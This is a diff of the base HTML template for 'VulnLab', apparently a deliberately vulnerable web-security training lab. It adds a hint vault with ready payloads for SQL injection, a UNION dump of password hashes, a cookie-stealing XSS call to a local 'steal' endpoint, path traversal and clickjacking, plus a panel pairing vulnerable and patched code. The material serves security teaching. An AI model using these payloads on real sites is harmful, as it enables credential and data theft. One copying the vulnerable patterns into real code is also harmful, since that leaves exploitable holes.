@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,11 +8,14 @@
     {% block extra_head %}{% endblock %}
 </head>
 <body>
+    <!-- Floating Toast Container -->
+    <div id="toast-container"></div>
+
     <!-- Sidebar Menu -->
     <nav class="sidebar">
         <div class="sidebar-header">
-            <h2>VulnLab</h2>
-            <p>Ethical Hacking Sandbox</p>
+            <h2><span class="brand-dot"></span> VulnLab</h2>
+            <p>Security Sandbox</p>
         </div>
         <ul class="sidebar-menu">
             <li class="{% if request.endpoint == 'sqli.login' %}active{% endif %}">
@@ -86,12 +89,12 @@
             
             <li class="{% if request.endpoint == 'detector.view_detections' %}active{% endif %}">
                 <a href="{{ url_for('detector.view_detections') }}">
-                    <span class="level-num" style="background: #27ae60;">🛡️</span> WAF Detections
+                    <span class="level-num" style="background: rgba(16, 185, 129, 0.2); color: var(--emerald);">🛡️</span> WAF Detections
                 </a>
             </li>
             <li class="{% if request.endpoint == 'report.view_report' %}active{% endif %}">
                 <a href="{{ url_for('report.view_report') }}">
-                    <span class="level-num" style="background: #e67e22;">📊</span> Pentest Report
+                    <span class="level-num" style="background: rgba(245, 158, 11, 0.2); color: var(--amber);">📊</span> Pentest Report
                 </a>
             </li>
         </ul>
@@ -100,7 +103,14 @@
             <div class="progress-bar-bg">
                 <div class="progress-bar-fill" style="width: {{ (completed_levels|length / 11) * 100 }}%"></div>
             </div>
-            <p style="margin: 0; font-size: 0.85em; color: #bdc3c7;">Progress: {{ completed_levels|length }} / 11 Exploited</p>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-size: 0.8em; color: var(--text-dim); font-weight: 500;">
+                    Progress: <strong style="color: var(--cyan);">{{ completed_levels|length }} / 11</strong> Solved
+                </span>
+                <span style="font-size: 0.75em; color: var(--emerald); font-weight: bold;">
+                    {{ ((completed_levels|length / 11) * 100)|round|int }}%
+                </span>
+            </div>
         </div>
     </nav>
 
@@ -108,9 +118,8 @@
     <main class="main-content" style="flex-grow: 1; display: flex; flex-direction: column;">
         
         <!-- Live Sandbox Quick-Control Bar -->
-        <header class="sandbox-control-bar" style="background: #ffffff; border-bottom: 1px solid #e2e8f0; padding: 10px 25px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
-            <div style="display: flex; align-items: center; gap: 15px;">
-                <span style="font-weight: bold; font-size: 0.9em; color: #2d3748;">⚡ Live Lab Mode:</span>
+        <header class="sandbox-control-bar">
+            <div style="display: flex; align-items: center; gap: 14px; flex-wrap: wrap;">
                 {% set ep = request.endpoint %}
                 {% set current_flag = 'sqli' %}
                 {% if ep in ['xss.comments', 'xss.search_reflected'] %}{% set current_flag = 'xss' %}
@@ -124,17 +133,31 @@
                 {% endif %}
 
                 {% set is_vuln = vuln_mode_dict.get(current_flag, True) %}
-                <span id="live-mode-badge" style="font-size: 0.8em; font-weight: bold; padding: 4px 10px; border-radius: 12px; background: {% if is_vuln %}#fde8e8; color: #c81e1e;{% else %}#def7ec; color: #03543f;{% endif %}">
-                    {{ current_flag|upper }}: {% if is_vuln %}VULNERABLE (Exploits Active){% else %}PATCHED (Secure Mode){% endif %}
+                <span style="font-size: 0.8em; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; padding: 5px 12px; border-radius: 20px; background: {% if is_vuln %}rgba(244, 63, 94, 0.15); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.3);{% else %}rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3);{% endif %}">
+                    ● Mode: {% if is_vuln %}VULNERABLE{% else %}PATCHED{% endif %}
                 </span>
 
-                <button onclick="toggleActiveModule('{{ current_flag }}')" style="background: #edf2f7; border: 1px solid #cbd5e0; padding: 4px 10px; border-radius: 4px; font-size: 0.8em; font-weight: bold; cursor: pointer; color: #4a5568;">
+                <button onclick="toggleActiveModule('{{ current_flag }}')" class="btn-control">
                     ⇄ Switch to {% if is_vuln %}Patched{% else %}Vulnerable{% endif %}
+                </button>
+
+                <button onclick="openCodeDiff('{{ current_flag }}')" class="btn-control">
+                    👁️ Code Diff
+                </button>
+
+                <!-- Guarded Intel Vault (Hard to Reach Hints) -->
+                <button onclick="openIntelVault()" class="btn-control" style="border-color: rgba(245, 158, 11, 0.3); color: var(--amber);">
+                    🔐 Intel Vault
                 </button>
             </div>
 
             <div style="display: flex; gap: 10px; align-items: center;">
-                <button onclick="resetLabData()" style="background: #fff5f5; border: 1px solid #feb2b2; color: #c53030; padding: 4px 12px; border-radius: 4px; font-size: 0.8em; font-weight: bold; cursor: pointer;">
+                <!-- Theme Toggle Button -->
+                <button onclick="toggleTheme()" class="btn-control" id="theme-btn" title="Toggle Dark/Light Mode">
+                    🌙 Theme
+                </button>
+
+                <button onclick="resetLabData()" class="btn-control btn-danger">
                     🔄 Reset Sandbox
                 </button>
             </div>
@@ -143,7 +166,7 @@
         <!-- Flash messages -->
         {% with messages = get_flashed_messages(with_categories=true) %}
           {% if messages %}
-            <div class="flash-messages-global" style="margin: 15px 25px 0 25px;">
+            <div class="flash-messages-global" style="margin: 20px 30px 0 30px;">
               {% for category, message in messages %}
                 <div class="alert alert-{{ category }}">{{ message }}</div>
               {% endfor %}
@@ -151,13 +174,335 @@
           {% endif %}
         {% endwith %}
 
-        <div class="content-wrapper" style="flex-grow: 1; padding: 25px;">
+        <div class="content-wrapper">
             {% block content %}
             {% endblock %}
         </div>
     </main>
 
+    <!-- ==========================================================================
+         MODAL 1: Guarded Intel Vault (Multi-Step Progressive Hints)
+         ========================================================================== -->
+    <div id="intel-modal" class="modal-backdrop">
+        <div class="modal-window">
+            <div class="modal-header">
+                <h3>🔐 Security Intelligence & Hint Vault</h3>
+                <button onclick="closeModal('intel-modal')" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div style="background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); border-radius: 8px; padding: 14px 18px; margin-bottom: 20px;">
+                    <div style="font-weight: 700; color: var(--amber); margin-bottom: 4px;">⚠️ Training Integrity Warning</div>
+                    <div style="font-size: 0.88em; color: var(--text-muted);">
+                        To maximize learning, try identifying the vulnerability manually before accessing assistance. Intel tiers are progressively unlocked below.
+                    </div>
+                </div>
+
+                <!-- Tier 1: Conceptual Direction -->
+                <div class="intel-tier">
+                    <div class="intel-tier-header" onclick="toggleTier('tier-1')">
+                        <span>🔍 Tier 1: Conceptual Direction</span>
+                        <span id="tier-1-icon">▶</span>
+                    </div>
+                    <div id="tier-1" class="intel-tier-content">
+                        <p id="intel-concept">Loading conceptual intelligence...</p>
+                    </div>
+                </div>
+
+                <!-- Tier 2: Technical Vector -->
+                <div class="intel-tier">
+                    <div class="intel-tier-header" onclick="toggleTier('tier-2')">
+                        <span>⚡ Tier 2: Attack Vector & Mechanism</span>
+                        <span id="tier-2-icon">▶</span>
+                    </div>
+                    <div id="tier-2" class="intel-tier-content">
+                        <p id="intel-vector">Loading attack vector...</p>
+                    </div>
+                </div>
+
+                <!-- Tier 3: Exploit Payload (Guarded Behind Explicit Unlock) -->
+                <div class="intel-tier" style="border-color: rgba(244, 63, 94, 0.3);">
+                    <div class="intel-tier-header" style="background: rgba(244, 63, 94, 0.05); color: var(--rose);" onclick="toggleTier('tier-3')">
+                        <span>💣 Tier 3: Full Exploit Payload (Spoiler)</span>
+                        <span id="tier-3-icon">▶</span>
+                    </div>
+                    <div id="tier-3" class="intel-tier-content">
+                        <div id="tier-3-locked">
+                            <p style="color: var(--text-muted); margin-bottom: 12px;">This reveals the exact exploit payload string. Confirm that you want to reveal the solution.</p>
+                            <button onclick="unlockPayload()" class="btn-unlock" style="background: rgba(244, 63, 94, 0.2); border-color: var(--rose); color: #fb7185;">
+                                🔓 Reveal Exploit Payload
+                            </button>
+                        </div>
+                        <div id="tier-3-unlocked" style="display: none;">
+                            <p><strong>Exploit Payload:</strong></p>
+                            <div style="display: flex; gap: 8px; align-items: center; background: #090d16; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--border-subtle);">
+                                <code id="intel-payload" style="flex-grow: 1; word-break: break-all; color: var(--cyan); font-size: 0.9em;">...</code>
+                                <button onclick="copyPayload()" class="btn-control" style="font-size: 0.75em; padding: 4px 8px;">📋 Copy</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==========================================================================
+         MODAL 2: Code Diff (Vulnerable vs Patched Inspection)
+         ========================================================================== -->
+    <div id="diff-modal" class="modal-backdrop">
+        <div class="modal-window" style="max-width: 900px;">
+            <div class="modal-header">
+                <h3>👁️ Root Cause Code Diff & Remediation</h3>
+                <button onclick="closeModal('diff-modal')" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div id="diff-content">Loading code inspection...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Global Client Logic -->
     <script>
+        // Theme Engine
+        function initTheme() {
+            const saved = localStorage.getItem('vulnlab_theme') || 'dark';
+            document.documentElement.setAttribute('data-theme', saved);
+            updateThemeButton(saved);
+        }
+
+        function toggleTheme() {
+            const current = document.documentElement.getAttribute('data-theme') || 'dark';
+            const next = current === 'dark' ? 'light' : 'dark';
+            document.documentElement.setAttribute('data-theme', next);
+            localStorage.setItem('vulnlab_theme', next);
+            updateThemeButton(next);
+        }
+
+        function updateThemeButton(theme) {
+            const btn = document.getElementById('theme-btn');
+            if (btn) btn.innerHTML = theme === 'dark' ? '☀️ Light' : '🌙 Dark';
+        }
+        initTheme();
+
+        // Modals Management
+        function openModal(id) {
+            document.getElementById(id).classList.add('active');
+        }
+
+        function closeModal(id) {
+            document.getElementById(id).classList.remove('active');
+        }
+
+        // Close modal on backdrop click
+        window.addEventListener('click', (e) => {
+            if (e.target.classList.contains('modal-backdrop')) {
+                e.target.classList.remove('active');
+            }
+        });
+
+        // Intelligence Vault Data
+        const INTEL_DATABASE = {
+            'sqli.login': {
+                concept: "Examine how the backend constructs the SQL query string upon receiving user input. Does it concatenate raw input directly into the query, or does it enforce parameterized separation?",
+                vector: "Authentication bypass using SQL string boundary termination and logical operator injection (' OR '1'='1).",
+                payload: "' OR '1'='1' -- "
+            },
+            'search.search': {
+                concept: "In a search query with multiple columns, how can an attacker query a completely different table and append those results to the current result set?",
+                vector: "UNION-based data extraction. Match the 3-column signature: (name, price, description) with (username, password_hash, 'x').",
+                payload: "' UNION SELECT username, password_hash, 'x' FROM users -- "
+            },
+            'xss.comments': {
+                concept: "Persistent data stored in the database is re-rendered to visitors. Does the rendering template engine enforce contextual HTML entity auto-escaping?",
+                vector: "Stored Cross-Site Scripting (XSS) executing in the browser context of any visitor who loads the guestbook.",
+                payload: "<script>fetch('http://127.0.0.1:9001/steal?c='+document.cookie)</script>"
+            },
+            'xss.search_reflected': {
+                concept: "URL query parameters echoed immediately back onto the webpage without output encoding can execute arbitrary client-side code.",
+                vector: "Reflected XSS delivered via crafted URL parameters.",
+                payload: "<script>alert(document.cookie)</script>"
+            },
+            'csrf_module.profile': {
+                concept: "State-changing POST requests that rely exclusively on ambient session cookies can be forged by external sites visited by the authenticated victim.",
+                vector: "Cross-Site Request Forgery (CSRF) via auto-submitting hidden HTML forms.",
+                payload: "Open attacks/csrf_attack.html in an external tab while authenticated."
+            },
+            'upload_module.upload': {
+                concept: "Does the backend deeply analyze magic bytes / file signatures, or does it naively rely on client-supplied Content-Type headers and weak extension checks?",
+                vector: "Insecure File Upload saving directly to publicly accessible static directories.",
+                payload: "Execute: python attacks/upload_attack.py"
+            },
+            'dashboard': {
+                concept: "Session IDs that are adopted before authentication and not cleared/regenerated allow attackers to pre-set user sessions.",
+                vector: "Session Fixation and cookie hijacking due to missing HttpOnly flags.",
+                payload: "Execute: python attacks/session_fixation.py"
+            },
+            'file_inclusion.view_doc': {
+                concept: "Direct concatenation of user-supplied filenames to directory paths allows relative path dot traversal outside the document root.",
+                vector: "Path Traversal and Local File Inclusion (LFI) via '../' climbing.",
+                payload: "../config.py"
+            },
+            'security_headers.security_headers_view': {
+                concept: "Missing defense-in-depth response headers allow third-party sites to frame the application in an invisible overlay.",
+                vector: "Clickjacking / UI Redressing due to missing X-Frame-Options and Content-Security-Policy.",
+                payload: "<iframe src='http://127.0.0.1:5000/profile'></iframe>"
+            },
+            'bruteforce.login_bruteforce': {
+                concept: "Authentication endpoints without throttling or lockout thresholds can be systematically attacked using wordlists.",
+                vector: "Credential guessing / dictionary brute-force.",
+                payload: "Execute: python attacks/bruteforce_attack.py"
+            },
+            'recon.recon_workbench': {
+                concept: "Overly descriptive crawler control files and exposed backup copies reveal sensitive endpoints to attackers.",
+                vector: "Information disclosure via /robots.txt and /config.py.bak.",
+                payload: "Visit: http://127.0.0.1:5000/robots.txt and /config.py.bak"
+            }
+        };
+
+        const CODE_DIFFS = {
+            'sqli': `
+<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
+    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
+        <strong>// VULNERABLE IMPLEMENTATION (Raw String Concatenation):</strong><br>
+        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"<br>
+        result = db.session.execute(text(query)).fetchone()
+    </div>
+    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
+        <strong>// PATCHED IMPLEMENTATION (Parameterized ORM):</strong><br>
+        user = User.query.filter_by(username=username).first()<br>
+        if user and check_password_hash(user.password_hash, password):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;# Safe authenticated session
+    </div>
+</div>`,
+            'xss': `
+<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
+    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
+        <strong>// VULNERABLE TEMPLATE SINK (Auto-escaping Disabled):</strong><br>
+        &lbrace;&lbrace; comment.text | safe &rbrace;&rbrace;
+    </div>
+    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
+        <strong>// PATCHED TEMPLATE SINK (Contextual HTML Escaping):</strong><br>
+        &lbrace;&lbrace; comment.text &rbrace;&rbrace;  &lt;!-- Translates &lt; to &amp;lt; --&gt;
+    </div>
+</div>`,
+            'traversal': `
+<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
+    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
+        <strong>// VULNERABLE (Unsanitized Path Concatenation):</strong><br>
+        target_path = os.path.join(DOCS_DIR, filename)<br>
+        with open(target_path, 'r') as f: content = f.read()
+    </div>
+    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
+        <strong>// PATCHED (safe_join Boundary Verification + Whitelist):</strong><br>
+        safe_path = safe_join(DOCS_DIR, filename)<br>
+        if not safe_path or filename not in ALLOWED_DOCS:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return "Access Denied", 403
+    </div>
+</div>`,
+            'bruteforce': `
+<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
+    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
+        <strong>// VULNERABLE:</strong><br>
+        # No attempt tracking, delays, or lockout controls.
+    </div>
+    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
+        <strong>// PATCHED (Sliding-Window Rate Limiter):</strong><br>
+        attempts = FAILED_ATTEMPTS.get(client_ip, [])<br>
+        if len(attempts) >= 5:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return "HTTP 429: Account locked for 60 seconds", 429
+    </div>
+</div>`,
+            'csrf': `
+<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
+    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
+        <strong>// VULNERABLE:</strong><br>
+        # Relies purely on ambient cookie with no token or SameSite enforcement.
+    </div>
+    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
+        <strong>// PATCHED:</strong><br>
+        SESSION_COOKIE_SAMESITE = 'Strict'<br>
+        CSRFProtect(app) &lt;!-- Mandates cryptographic csrf_token on all POSTs --&gt;
+    </div>
+</div>`
+        };
+
+        const currentEndpoint = "{{ request.endpoint }}";
+
+        function openIntelVault() {
+            const intel = INTEL_DATABASE[currentEndpoint] || {
+                concept: "Focus on the input parameters and how the backend handles client data.",
+                vector: "Standard web application attack surface.",
+                payload: "Consult documentation for manual vectors."
+            };
+
+            document.getElementById('intel-concept').innerText = intel.concept;
+            document.getElementById('intel-vector').innerText = intel.vector;
+            document.getElementById('intel-payload').innerText = intel.payload;
+            
+            // Reset tiers to collapsed and payload to locked
+            ['tier-1', 'tier-2', 'tier-3'].forEach(t => {
+                document.getElementById(t).classList.remove('unlocked');
+                document.getElementById(t + '-icon').innerText = '▶';
+            });
+            document.getElementById('tier-3-locked').style.display = 'block';
+            document.getElementById('tier-3-unlocked').style.display = 'none';
+
+            openModal('intel-modal');
+        }
+
+        function toggleTier(tierId) {
+            const content = document.getElementById(tierId);
+            const icon = document.getElementById(tierId + '-icon');
+            if (content.classList.contains('unlocked')) {
+                content.classList.remove('unlocked');
+                icon.innerText = '▶';
+            } else {
+                content.classList.add('unlocked');
+                icon.innerText = '▼';
+            }
+        }
+
+        function unlockPayload() {
+            document.getElementById('tier-3-locked').style.display = 'none';
+            document.getElementById('tier-3-unlocked').style.display = 'block';
+            showToast('Exploit payload unlocked in Intel Vault.', 'info');
+        }
+
+        function copyPayload() {
+            const text = document.getElementById('intel-payload').innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('Payload copied to clipboard!', 'info');
+            });
+        }
+
+        function openCodeDiff(feature) {
+            const diffHtml = CODE_DIFFS[feature] || '<p>Detailed code inspection available in DEVELOPER_DOCS.md.</p>';
+            document.getElementById('diff-content').innerHTML = diffHtml;
+            openModal('diff-modal');
+        }
+
+        // Toast Engine
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+            
+            let icon = 'ℹ️';
+            if (type === 'waf') icon = '🛡️';
+            if (type === 'solved') icon = '🎉';
+            
+            toast.innerHTML = `
+                <span style="font-size: 1.2em;">${icon}</span>
+                <span style="font-size: 0.88em; font-weight: 500; color: var(--text-main);">${message}</span>
+            `;
+            container.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateX(50px)';
+                setTimeout(() => toast.remove(), 250);
+            }, 4000);
+        }
+
         function toggleActiveModule(feature) {
             fetch('/admin/toggle/' + feature, { method: 'POST' })
                 .then(r => r.json())
@@ -170,7 +515,7 @@
         }
 
         function resetLabData() {
-            if (confirm("Reset all database tables, uploaded files, and WAF detection logs to pristine state?")) {
+            if (confirm("Reset all database tables, uploaded files, and WAF detection logs to pristine initial state?")) {
                 fetch('/admin/reset_lab', { method: 'POST' })
                     .then(r => r.json())
                     .then(res => {
